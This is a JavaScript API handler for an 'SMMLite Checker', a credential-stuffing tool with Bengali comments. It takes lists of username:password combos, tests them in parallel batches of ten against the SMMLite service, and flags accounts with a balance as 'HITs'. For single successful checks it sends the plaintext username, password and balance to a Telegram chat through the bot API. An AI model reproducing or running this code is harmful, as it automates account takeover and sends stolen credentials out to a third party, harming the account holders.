// api/check.js – SMMLite Checker with parallel batch processing (for website)
import { checkAccount } from '../lib/checkCore.js';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';

const CONCURRENCY = 10; // ওয়েবসাইটের জন্য ১০টি প্যারালাল

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { username, password, combos, testOnly } = req.body;

  if (testOnly) {
    // ... (test mode code – আগের মতো)
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      return res.status(200).json({ success: false, error: 'Bot token or chat ID missing' });
    }
    const testMsg = '✅ Telegram connection successful!\n\nAuto‑post will work for SMMLite HIT accounts.';
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: testMsg,
          parse_mode: 'Markdown',
          disable_web_page_preview: true
        })
      });
      const result = await response.json();
      if (!result.ok) {
        return res.status(200).json({ success: false, error: result.description || 'Unknown error' });
      }
      return res.status(200).json({ success: true, message: 'Test message sent!' });
    } catch (err) {
      return res.status(200).json({ success: false, error: err.message });
    }
  }

  // ===== BATCH CHECK (ওয়েবসাইট থেকে একাধিক কম্বো এলে) =====
  if (combos && Array.isArray(combos) && combos.length > 0) {
    const results = [];
    for (let i = 0; i < combos.length; i += CONCURRENCY) {
      const chunk = combos.slice(i, i + CONCURRENCY);
      const chunkResults = await Promise.all(
        chunk.map(async (combo) => {
          const [user, pass] = combo.split(':');
          if (!user || !pass) {
            return { combo, valid: false, hit: false, balance: 0, message: 'Invalid format' };
          }
          const result = await checkAccount(user.trim(), pass.trim());
          return { combo, ...result };
        })
      );
      results.push(...chunkResults);
    }
    return res.status(200).json({ results });
  }

  // ===== SINGLE CHECK =====
  if (!username || !password) {
    return res.status(400).json({ error: 'Missing username or password' });
  }

  const result = await checkAccount(username, password);

  if (result.hit && TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
    const message = `🎯 *HIT on SMMLite By @shakib2016*\n\n` +
                    `👤 *Username:* ${username}\n` +
                    `🔑 *Password:* \`${password}\`\n` +
                    `💰 *Balance:* $${result.balance.toFixed(6)}\n\n` +
                    `#SMMLite @shakib2016 #HIT`;
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
          disable_web_page_preview: true
        })
      });
    } catch(e) {}
  }

  return res.status(200).json(result);
}
